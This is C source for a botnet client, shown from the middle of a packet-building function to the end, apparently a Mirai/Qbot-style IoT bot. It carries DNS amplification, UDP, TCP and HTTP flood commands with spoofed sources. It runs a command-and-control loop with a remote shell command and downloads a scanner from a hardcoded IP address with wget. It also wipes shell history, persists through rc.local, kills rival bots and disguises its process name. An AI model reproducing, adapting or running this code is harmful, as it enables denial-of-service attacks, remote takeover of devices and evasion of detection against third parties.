    ip -> saddr = inet_addr(trgt_ip);
    ip -> daddr = sin.sin_addr.s_addr;
    ip -> check = csum((unsigned short * ) datagram, ip -> tot_len);

    udph * udp = (udph * )(datagram + sizeof(iph));
    udp -> source = htons(trgt_p);
    udp -> dest = htons(53);
    udp -> len = htons(8 + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));
    udp -> check = 0;

    // Pseudoheader creation and checksum calculation
    ps_hdr pshdr;
    pshdr.saddr = inet_addr(trgt_ip);
    pshdr.daddr = sin.sin_addr.s_addr;
    pshdr.filler = 0;
    pshdr.protocol = IPPROTO_UDP;
    pshdr.len = htons(sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));

    int pssize = sizeof(ps_hdr) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query);
    psgram = malloc(pssize);

    memcpy(psgram, (char * ) & pshdr, sizeof(ps_hdr));
    memcpy(psgram + sizeof(ps_hdr), udp, sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));

    udp -> check = csum((unsigned short * ) psgram, pssize);

    // Send data
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sd == -1) return;
    else sendto(sd, datagram, ip -> tot_len, 0, (struct sockaddr * ) & sin, sizeof(sin));

    free(psgram);
    close(sd);

    return;
}

void dnsflood(void * par1) {
    if (!listFork()) return;
    struct thread_data * td = (struct thread_data * ) par1;
    char * target = td -> target;
    int dport = td -> dport;
    int secs = td -> time;
    char buffer[100];
    init_rand(time(NULL) ^ getpid());
    int i = 0;
    int end = time(NULL) + secs;
    while (1) {
        FILE * fp = fopen("./DNS.txt", "r");
        while (fgets(buffer, 100, fp)) {
            if ((buffer[strlen(buffer) - 1] == '\n') || (buffer[strlen(buffer) - 1] == '\r')) {
                buffer[strlen(buffer) - 1] = 0x00;
            }
            dns_send(target, dport, buffer, "irctc.co.in");
            pps++;
            if (i >= limiter) {
                i = 0;
                usleep(sleeptime);
            }
            i++;
            if (time(NULL) > end) {
                exit(0);
            }
        }
        fclose(fp);
    }
}

void botkiller() {
    int i;
    while (1) {
        for (i = 0; i < 9; i++) {
            char command[80];
            sprintf(command, "pkill -9 ");
            strcat(command, knownBots[i]);
            system(command);
            sprintf(command, "||busybox pkill -9 ");
            strcat(command, knownBots[i]);
            strcat(command, "");
            system(command);
        }
        sleep(5);
    }
}

void ClearHistory() {
    system("history -c;history -w");
    system("cd /root;rm -rf .bash_history");
    system("cd /var/tmp; rm -f *");
}

void binsBins() {
    int pid;

    if ((pid = fork()) == 0) {
        system(rekdevice);
        sleep(20); //sleeping for 20 dont wanna kill all your bots.
    } else {
        printf("%d\n", pid);
    }

    return;
}


int download(char *url, char *saveas) {
    int sock2, i, d;
    struct sockaddr_in server;
    unsigned long ipaddr;
    char buf[1024];
    FILE * file;
    char bufm[4096];
    if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        return 3;
    }
    if (!strncmp(url, "http://", 7)) strcpy(buf, url + 7);
    else strcpy(buf, url);
    for (i = 0; i < strlen(buf) && buf[i] != '/'; i++);
    buf[i] = 0;
    server.sin_family = AF_INET;
    server.sin_port = htons(80);
    if ((ipaddr = inet_addr(buf)) == -1) {
        struct hostent * hostm;
        if ((hostm = gethostbyname(buf)) == NULL) {
            return 2;
        }
        memcpy((char *)&server.sin_addr, hostm->h_addr, hostm->h_length);
    } else server.sin_addr.s_addr = ipaddr;
    memset(&(server.sin_zero), 0, 8);
    if (connect(sock2, (struct sockaddr * )&server, sizeof(server)) != 0) {
        return 1;
    }
    sockprintf(sock2, "GET /%s HTTP/1.1\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n", buf + i + 1, buf);
    file = fopen(saveas, "wb");
    while (1) {
        int i;
        if ((i = recv(sock2, bufm, 4096, 0)) <= 0) break;
        if (i < 4096) bufm[i] = 0;
        for (d = 0; d < i; d++)
            if (!strncmp(bufm + d, "\r\n\r\n", 4)) {
                for (d += 4; d < i; d++) fputc(bufm[d], file);
                goto downloaded;
            }
    }
    downloaded:
        while (1) {
            int i, d;
            if ((i = recv(sock2, bufm, 4096, 0)) <= 0) break;
            if (i < 4096) bufm[i] = 0;
            for (d = 0; d < i; d++) fputc(bufm[d], file);
        }
    fclose(file);
    close(sock2);
    return 0;
}


void processCmd(int argc, unsigned char * argv[]) {

    if (!strcmp(argv[0], "PYTHON")) //Thanks to B1NARY for the python scanner :P
    {
        if (!strcmp(argv[1], "INSTALL")) {
            system("sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget http://199.38.245.222/good2.py");
            ClearHistory();
            sockprintf(mainCommSock, "INSTALLING PYTHON SCANNER");
        }
        if (!strcmp(argv[1], "bins")) {
            system("cd /.tmp;rm -rf *py;wget http://199.38.245.222/good2.py");
            ClearHistory();
            sockprintf(mainCommSock, "UPDATING PYTHON SCANNER");
        }
        if (!strcmp(argv[1], "OFF")) {
            system("killall -9 python;pkill python");
            ClearHistory();
            sockprintf(mainCommSock, "STOPPING PYTHON SCANNER");
        }
        if (!strcmp(argv[1], "START")) {
            system("cd /.tmp;python good2.py 1000 LUCKY 1 3");
            ClearHistory();
            sockprintf(mainCommSock, "STARTING LE HACKA SCANNA");
        }

    }

    if (!strcmp(argv[0], "PING")) {
        sockprintf(mainCommSock, "PONG!");
        return;
    }

    if (!strcmp(argv[0], "TABLE")) {
        sockprintf(mainCommSock, "%d", getdtablesize());
        return;
    }

    if (!strcmp(argv[0], "bins")) {
        sockprintf(mainCommSock, "bins TAKEN SUCCESFULLY");
        binsBins(1);
        return;
    }

    if (!strcmp(argv[0], "SCANNER")) {
        if (!strcmp(argv[1], "OFF")) {
            if (scanPid == 0) return;
            kill(scanPid, 9);
            sockprintf(mainCommSock, "STOPPING SCANNER");
            scanPid = 0;
        }
        if (!strcmp(argv[1], "ON")) {
            if (scanPid != 0) return;
            int parent;
            int i;
            parent = fork();
            int fds = 8192; //if you change this it adds more threads to the scanner but will also fuck your bots.
            int forks = sysconf(_SC_NPROCESSORS_ONLN) * 64; //32 scan forks for each CPU core.
            int timeout = 10;
            if (parent > 0) {
                scanPid = parent;
                return;
            } else if (parent == -1) return;
            sockprintf(mainCommSock, "STARTING SCANNER ON -> %s", inet_ntoa(ourIP));
            for(i = 0; i < forks; i++) {
                StartTheLelz(timeout, fds);
            }
            _exit(0);
        }
    }

    if (!strcmp(argv[0], "BOTKILL")) {
        if (!listFork()) {
            sockprintf(mainCommSock, "COMMENCING BOT KILL ON -> %s", inet_ntoa(ourIP));
            botkiller();
            _exit(0);
        }
    }

    if (!strcmp(argv[0], "GETPUBLICIP")) {
        sockprintf(mainCommSock, "My Public IP: %s", inet_ntoa(ourIP));
        return;
    }

    if (!strcmp(argv[0], "UDP")) {
        if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
            sockprintf(mainCommSock, "UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
            return;
        }

        unsigned char * ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        int packetsize = atoi(argv[5]);
        int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
        int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
        int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);

        if (strstr(ip, ",") != NULL) {
            unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                if (!listFork()) {
                    sendUDP(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (!listFork()) {
                sendUDP(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
        return;
    }

    if (!strcmp(argv[0], "TCP")) {
        if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1)) {
            sockprintf(mainCommSock, "TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
            return;
        }

        unsigned char * ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        unsigned char * flags = argv[5];

        int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
        int psize = argc > 6 ? atoi(argv[6]) : 0;

        if (strstr(ip, ",") != NULL) {
            unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                if (!listFork()) {
                    sendTCP(hi, port, time, spoofed, flags, psize, pollinterval);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (!listFork()) {
                sendTCP(ip, port, time, spoofed, flags, psize, pollinterval);
                _exit(0);
            }
        }
    }
    if (!strcmp(argv[0], "HTTP")) {
        if (argc < 6) {
            sockprintf(mainCommSock, "HTTP <method> <host> <port> <path> <time> <power>");
            return;
        }
        if (strstr((const char * ) argv[1], ",") != NULL) {
            unsigned char * hi = (unsigned char * ) strtok((char * ) argv[1], ",");
            while (hi != NULL) {
                if (!listFork()) {
                    sendHTTP((char * ) argv[1], (char * ) argv[2], atoi((char * ) argv[3]), (char * ) argv[4], atoi((char * ) argv[5]), atoi((char * ) argv[6]));
                    _exit(0);
                }
                hi = (unsigned char * ) strtok(NULL, ",");
            }
        } else {
            if (listFork()) {
                return;
            }
            sendHTTP((char * ) argv[1], (char * ) argv[2], atoi((char * ) argv[3]), (char * ) argv[4], atoi((char * ) argv[5]), atoi((char * ) argv[6]));
            _exit(0);
        }
    }
    if (!strcmp(argv[0], "DNS")) {
        int get;
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        if (argc < 6) {
            sockprintf(mainCommSock, "DNS <target IP> <port> <reflection file url> <forks> <pps limiter, -1 for no limit> <time>");
            exit(0);
        }
        if (!listFork()) {
            srand(time(NULL));
            int num_threads = atoi(argv[4]);
            int maxpps = atoi(argv[5]);
            int i, limiter = 0;
            download(argv[3], "./DNS.txt");
            sockprintf(mainCommSock, "DNS amplification flooding %s:%s for %d seconds at %d pps", argv[1], argv[2], atoi(argv[6]), atoi(argv[5]));
            struct thread_data td[num_threads];
            for (i = 0; i < num_threads; i++) {
                td[i].thread_id = i;
                td[i].target = argv[1];
                td[i].dport = atoi(argv[2]);
                td[i].limiter = limiter;
                td[i].time = atoi(argv[6]);

                dnsflood((void * ) & td[i]);
            }
        }
    }

    if (!strcmp(argv[0], "HOLD")) {
        if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
            sockprintf(mainCommSock, "HOLD <target> <port> <time>");
            return;
        }

        unsigned char * ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);

        if (strstr(ip, ",") != NULL) {
            unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                if (!listFork()) {
                    sendHOLD(hi, port, time);
                    close(mainCommSock);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) {
                return;
            }

            sendHOLD(ip, port, time);
            _exit(0);
        }
    }
    if (!strcmp(argv[0], "JUNK")) {
        if (argc < 3 || atoi(argv[3]) < 0) {
            sockprintf(mainCommSock, "JUNK <ip> <port> <time>");
            return;
        }
        unsigned char * ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);

        if (strstr(ip, ",") != NULL) {
            unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                if (!listFork()) {
                    sendJUNK(hi, port, time);
                    close(mainCommSock);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) {
                return;
            }

            sendJUNK(ip, port, time);
            _exit(0);
        }
    }
    if (!strcmp(argv[0], "STD")) {
        if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
            sockprintf(mainCommSock, "STD <target> <port> <time>");
            return;
        }

        unsigned char * ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);

        if (strstr(ip, ",") != NULL) {
            unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                if (!listFork()) {
                    sendSTD(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) {
                return;
            }
            sendSTD(ip, port, time);
            _exit(0);
        }
    }
    if (!strcmp(argv[0], "KILL")) {
        int killed = 0;
        unsigned long i;
        for (i = 0; i < numpids; i++) {
            if (pids[i] != 0 && pids[i] != getpid()) {
                kill(pids[i], 9);
                killed++;
            }
        }

        if (killed > 0) {
            sockprintf(mainCommSock, "Killed %d.", killed);
        } else {
            sockprintf(mainCommSock, "None Killed.");
        }
    }

    if (!strcmp(argv[0], "KILLMYEYEPEEUSINGHOIC")) {
        exit(0);
    }
}

int initConnection() {
    unsigned char server[4096];
    memset(server, 0, 4096);
    if (mainCommSock) {
        close(mainCommSock);
        mainCommSock = 0;
    }
    if (currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
    else currentServer++;

    strcpy(server, cncServer[currentServer]);
    int port = 23;
    if (strchr(server, ':') != NULL) {
        port = atoi(strchr(server, ':') + 1);
        *((unsigned char * )(strchr(server, ':'))) = 0x0;
    }

    mainCommSock = socket(AF_INET, SOCK_STREAM, 0);

    if (!connectTimeout(mainCommSock, server, port, 30)) return 1;

    return 0;
}

int getOurIP() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) return 0;

    struct sockaddr_in serv;
    memset( & serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr * ) & serv, sizeof(serv));
    if (err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr * ) & name, & namelen);
    if (err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;

    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while (fdgets(linebuf, 4096, cmdline) != NULL) {
        if (strstr(linebuf, "\t00000000\t") != NULL) {
            unsigned char * pos = linebuf;
            while ( * pos != '\t') pos++;
            * pos = 0;
            break;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if ( * linebuf) {
        int i;
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf);
        ioctl(sock, SIOCGIFHWADDR, & ifr);
        for (i = 0; i < 6; i++) macAddress[i] = ((unsigned char * ) ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock);
}

char *getBuild() { //Get current architecture, detectx nearly every architecture. Coded by Freak
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__)
    return "ARM2";
    #elif defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
    return "ARM3";
    #elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "ARM4T";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "ARM5"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_)
    return "ARM6T2";
    #elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)
    return "ARM6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "ARM7";
    #elif defined(__aarch64__)
    return "ARM64";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "MIPS";
    #elif defined(__sh__)
    return "SUPERH";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "POWERPC";
    #elif defined(__sparc__) || defined(__sparc)
    return "SPARC";
    #elif defined(__m68k__)
    return "M68K";
    #else
    return "UNKNOWN";
    #endif
}

void makeFukdString(char *buf, int length) {
    srand(time(NULL));
    int i = 0;
    for (i = 0; i < length; i++) buf[i] = (rand() % 223) + 33; // No spaces.
}

void touchMyself(unsigned char **argv) {
    if (!fork()) {
        while (1) {
            makeFukdString(argv[0], 1024 + (rand() % 128)); // Crashes almost all /proc/pid/cmdline based botkillers. Including Mirai. sweg
            sleep(3); // rape process name every 3 seconds
        }
    }
    return;
}

int main(int argc, char *argv[]) {

    printf("LULZbOT\n");
    actualparent = getpid();
    pid_t process_id = 0;
    pid_t sid = 0;
    // Create child process
    process_id = fork();
    // Indication of fork() failure
    if (process_id < 0) {
        // Return failure in exit status
        exit(1);
    }
    // PARENT PROCESS. Need to kill it.
    if (process_id > 0) {
        // return success in exit status
        exit(0);
    }
    //unmask the file mode
    umask(0);
    //set new session
    sid = setsid();
    if (sid < 0) {
        // Return failure
        exit(1);
    }
    // Change the current working directory to root.
    chdir("/");
    // Close stdin. stdout and stderr
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    touchMyself(&argv); // Mega anti botkill. completely hides process name. nearly like a rootkit but more noisy
    char * mynameis = "";
    if (SERVER_LIST_SIZE <= 0) return 0;
    strncpy(argv[0], "", strlen(argv[0]));
    argv[0] = "";
    srand(time(NULL) ^ getpid());
    init_rand(time(NULL) ^ getpid());
    pid_t pid1;
    pid_t pid2;
    int status;
    int dupthing = 0;

    char cwd[256], * str;
    FILE * file;
    str = "/etc/rc.d/rc.local";
    file = fopen(str, "r");
    if (file == NULL) {
        str = "/etc/rc.conf";
        file = fopen(str, "r");
    }
    if (file != NULL) {
        char outfile[256], buf[1024];
        int i = strlen(argv[0]), d = 0;
        getcwd(cwd, 256);
        if (strcmp(cwd, "/")) {
            while (argv[0][i] != '/') i--;
            sprintf(outfile, "\"%s%s\"\n", cwd, argv[0] + i);
            while (!feof(file)) {
                fgets(buf, 1024, file);
                if (!strcasecmp(buf, outfile)) d++;
            }
            if (d == 0) {
                FILE * out;
                fclose(file);
                out = fopen(str, "a");
                if (out != NULL) {
                    fputs(outfile, out);
                    fclose(out);
                }
            } else fclose(file);
        } else fclose(file);
    }

    getOurIP();

    if (pid1 = fork()) {
        waitpid(pid1, & status, 0);
        exit(0);
    } else if (!pid1) {
        if (pid2 = fork()) {
            exit(0);
        } else if (!pid2) {} else {
            zprintf("fork failed\n");
        }
    } else {
        zprintf("fork failed\n");
    }

    setsid();
    chdir("/");

    signal(SIGPIPE, SIG_IGN);

    while (1) {
        if (initConnection()) {
            sleep(30);
            continue;
        }

        sockprintf(mainCommSock, "BUILD %s:%s", getBuild(), inet_ntoa(ourIP));

        char commBuf[4096];
        int got = 0;
        int i = 0;
        while ((got = recvLine(mainCommSock, commBuf, 4096)) != -1) {
            for (i = 0; i < numpids; i++)
                if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                    unsigned int * newpids, on;
                    for (on = i + 1; on < numpids; on++) pids[on - 1] = pids[on];
                    pids[on - 1] = 0;
                    numpids--;
                    newpids = (unsigned int * ) malloc((numpids + 1) * sizeof(unsigned int));
                    for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                    free(pids);
                    pids = newpids;
                }

            commBuf[got] = 0x00;

            trim(commBuf);

            if (strstr(commBuf, "PING") == commBuf) {
                sockprintf(mainCommSock, "PONG");
                continue;
            }
            if (strstr(commBuf, "DUP") == commBuf) {
                dupthing++;
                zprintf("PEACE OUT IMMA DUP\n");
                if (dupthing > 20) {
                    exit(0);
                }
                break;
            }

            unsigned char * message = commBuf;

            if ( * message == '!') {
                unsigned char * nickMask = message + 1;
                while ( * nickMask != ' ' && * nickMask != 0x00) nickMask++;
                if ( * nickMask == 0x00) continue;
                *(nickMask) = 0x00;
                nickMask = message + 1;

                message = message + strlen(nickMask) + 2;
                while (message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                unsigned char * command = message;
                while ( * message != ' ' && * message != 0x00) message++;
                * message = 0x00;
                message++;

                unsigned char * tmpcommand = command;
                while ( * tmpcommand) {* tmpcommand = toupper( * tmpcommand);
                    tmpcommand++;
                }

                if (strcmp(command, "SH") == 0) {
                    unsigned char buf[1024];
                    int command;
                    if (listFork()) continue;
                    memset(buf, 0, 1024);
                    szprintf(buf, "%s 2>&1", message);
                    command = fdpopen(buf, "r");
                    while (fdgets(buf, 1024, command) != NULL) {
                        trim(buf);
                        sockprintf(mainCommSock, "%s", buf);
                        memset(buf, 0, 1024);
                        sleep(1);
                    }
                    fdpclose(command);
                    exit(0);
                }

                unsigned char * params[10];
                int paramsCount = 1;
                unsigned char * pch = strtok(message, " ");
                params[0] = command;

                while (pch) {
                    if ( * pch != '\n') {
                        params[paramsCount] = (unsigned char * ) malloc(strlen(pch) + 1);
                        memset(params[paramsCount], 0, strlen(pch) + 1);
                        strcpy(params[paramsCount], pch);
                        paramsCount++;
                    }
                    pch = strtok(NULL, " ");
                }

                processCmd(paramsCount, params);

                if (paramsCount > 1) {
                    int q = 1;
                    for (q = 1; q < paramsCount; q++) {
                        free(params[q]);
                    }
                }
            }
        }
    }

    return 0;
    printf("client exiting");
}